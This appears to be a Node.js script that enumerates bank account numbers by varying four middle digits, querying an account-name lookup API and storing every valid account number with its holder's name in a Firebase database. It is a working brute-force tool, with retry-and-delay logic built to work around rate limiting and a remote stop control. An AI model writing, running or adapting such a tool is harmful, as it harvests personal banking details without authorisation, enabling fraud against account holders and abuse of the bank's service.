import axios from 'axios';
import fs from 'fs';
import admin from 'firebase-admin';
import chalk from 'chalk';
import prettyMs from 'pretty-ms';

const serviceAccount = JSON.parse(process.env.FIREBASE_KEY_JSON);

admin.initializeApp({
  credential: admin.credential.cert(serviceAccount),
  databaseURL: 'https://a-b-c-s-default-rtdb.firebaseio.com',
});

const db = admin.database();
const attemptsRef = db.ref('Attempt');
const validRef = db.ref('Valid Account');
const controlRef = db.ref('control');

const BANK_CODE = process.env.BANK_CODE;
const API_URL = process.env.API_URL;
const TOKEN = process.env.API_TOKEN;

const FIRST3 = '217';
const LAST3 = '281';

let start = 0;
if (fs.existsSync('state.json')) {
  const state = JSON.parse(fs.readFileSync('state.json', 'utf8'));
  start = state.last || 0;
}

let stop = false;
controlRef.child('status').on('value', (snap) => {
  stop = snap.val() === 'stop';
});

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function saveState(i) {
  fs.writeFileSync('state.json', JSON.stringify({ last: i }), 'utf8');
}

async function isAlreadyValidated(accountNumber) {
  const snapshot = await validRef.orderByChild('accountNumber').equalTo(accountNumber).once('value');
  return snapshot.exists();
}

async function bruteForce() {
  console.log(chalk.green(`🚀 Starting Brute-force from: ${start.toString().padStart(4, '0')}`));
  const startTime = Date.now();

  for (let i = start; i <= 9999; i++) {
    if (stop) {
      console.log(chalk.yellow('⏸️ Firebase control: STOP triggered.'));
      saveState(i);
      break;
    }

    const middle = i.toString().padStart(4, '0');
    const accountNumber = `${FIRST3}${middle}${LAST3}`;
    const timestamp = new Date().toISOString();

    if (await isAlreadyValidated(accountNumber)) {
      console.log(chalk.cyan(`[SKIPPED] ${accountNumber} already validated.`));
      continue;
    }

    let retryCount = 0;
    const MAX_RETRIES = 5;

    while (retryCount <= MAX_RETRIES) {
      try {
        const res = await axios.get(`${API_URL}?account_number=${accountNumber}&bank_code=${BANK_CODE}`, {
          headers: { Authorization: `Bearer ${TOKEN}` }
        });

        const data = res.data;

        await attemptsRef.push({ timestamp, accountNumber, data });

        if (data.status === 200 && data.account_name) {
          await validRef.push({ timestamp, accountNumber, ...data });
          console.log(chalk.green(`[VALID ✅] ${accountNumber} → ${data.account_name}`));
        } else {
          console.log(chalk.gray(`[INVALID ❌] ${accountNumber}`));
        }

        break;

      } catch (err) {
        retryCount++;
        const status = err.response?.status;

        if (status === 429) {
          const waitTime = 10000 + (retryCount * 2000);
          console.log(chalk.red(`[RATE LIMIT] ${accountNumber} → Waiting ${waitTime / 1000}s...`));
          await sleep(waitTime);
        } else {
          console.log(chalk.red(`[ERROR] ${accountNumber} → Retry ${retryCount}/${MAX_RETRIES}`));
          await sleep(1500);
        }

        if (retryCount >= MAX_RETRIES) {
          console.log(chalk.yellow(`[SKIPPED ❗] ${accountNumber} after ${MAX_RETRIES} retries.`));
        }
      }
    }

    await sleep(400 + Math.floor(Math.random() * 200));

    if (i % 20 === 0) saveState(i);
  }

  const duration = Date.now() - startTime;
  console.log(chalk.blue(`\n🎉 Finished in ${prettyMs(duration)}`));
}

bruteForce();
